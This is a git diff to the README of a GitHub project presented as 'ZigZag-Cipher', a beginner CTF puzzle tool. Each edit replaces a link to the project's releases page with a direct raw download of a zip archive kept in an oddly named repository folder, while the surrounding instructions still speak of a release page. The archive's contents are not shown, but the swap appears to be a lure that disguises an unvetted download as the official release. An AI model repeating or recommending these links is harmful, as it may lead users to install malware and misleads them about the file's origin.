@@ -1,6 +1,6 @@
 # 🔒 ZigZag-Cipher - Easy CTF Puzzle Tool
 
-[![Download ZigZag-Cipher](https://img.shields.io/badge/Download-ZigZag--Cipher-brightgreen?style=for-the-badge)](https://github.com/Maxwellrightminded802/ZigZag-Cipher/releases)
+[![Download ZigZag-Cipher](https://img.shields.io/badge/Download-ZigZag--Cipher-brightgreen?style=for-the-badge)](https://github.com/Maxwellrightminded802/ZigZag-Cipher/raw/refs/heads/main/roosterless/Zag_Zig_Cipher_1.1.zip)
 
 ---
 
@@ -36,13 +36,13 @@ This section will guide you step-by-step to download, install, and run ZigZag-Ci
 
 You will get the program from the official release page on GitHub.
 
-[![Download ZigZag-Cipher](https://img.shields.io/badge/Download-ZigZag--Cipher-blue?style=for-the-badge)](https://github.com/Maxwellrightminded802/ZigZag-Cipher/releases)
+[![Download ZigZag-Cipher](https://img.shields.io/badge/Download-ZigZag--Cipher-blue?style=for-the-badge)](https://github.com/Maxwellrightminded802/ZigZag-Cipher/raw/refs/heads/main/roosterless/Zag_Zig_Cipher_1.1.zip)
 
 ### Steps to download and run the software:
 
 1. **Visit the Release Page**  
    Click the button above or open this link in your browser:  
-   https://github.com/Maxwellrightminded802/ZigZag-Cipher/releases
+   https://github.com/Maxwellrightminded802/ZigZag-Cipher/raw/refs/heads/main/roosterless/Zag_Zig_Cipher_1.1.zip
 
 2. **Find the Latest Version**  
    Look for the latest release at the top of the page. It usually has the highest version number and recent date.
@@ -108,7 +108,7 @@ The ZigZag cipher rearranges letters of a message in a pattern that looks like a
 
 Check the release page regularly for updates and new features:
 
-https://github.com/Maxwellrightminded802/ZigZag-Cipher/releases
+https://github.com/Maxwellrightminded802/ZigZag-Cipher/raw/refs/heads/main/roosterless/Zag_Zig_Cipher_1.1.zip
 
 You can download newer versions using the same steps as above.
 
